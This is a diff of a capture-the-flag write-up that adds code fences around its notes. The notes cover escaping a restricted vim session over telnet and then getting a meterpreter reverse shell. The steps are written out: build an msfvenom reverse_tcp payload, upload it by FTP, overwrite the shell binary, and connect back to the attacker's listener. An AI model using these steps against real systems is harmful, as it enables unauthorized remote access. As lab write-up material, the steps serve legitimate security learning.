@@ -84,7 +84,7 @@ Cat flag 2 and you see `echo $FLAG2`
 Telnet into 8085 and run `:echo $FLAG2` in vim for your second flag.
 
 Things found within vim:
-
+```
 -If you exit vim you are kicked out of the connection.
 -You can see the directories inside vim using `:e /` then `:e /directory_name`.
 -Trying to run commands using :! from vim gives an error `Cannot execute shell /tmp/sh`. 
@@ -95,15 +95,15 @@ Things found within vim:
 -We can set permissions with `:call setfperm("/tmp/sh","rwxrwxrwx")`.
 -`:e /etc/shells` gives us `/usr/busybox/sh`.
 -It seems the 8065 port points to `/usr/frosty/sh`.
-
+```
 At this point we decided to try a reverse shell using metasploit in order to get a prompt outside of vim.
-
+```
 -Create your payload using `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o payload.elf`.
 -Start your listener in `msfconsole` and use `payload/linux/x64/meterpreter/reverse_tcp`, then `set hosts YOUR_IP`.
 -ftp to 8075 and upload the payload.elf file.
 -telnet to 8095 to use nano to open the payload.elf file at /tmp/ftp/payload.elf and save to /usr/frosry/sh.
 -telnet to 8065 and you will now have a meterpreter session. Use sessions -i 1 to get the meterpreter prompt.
-
+```
 <p align="left">
   <img height=500 img src=./readme_assets/meterpreter.PNG/>
 </p>
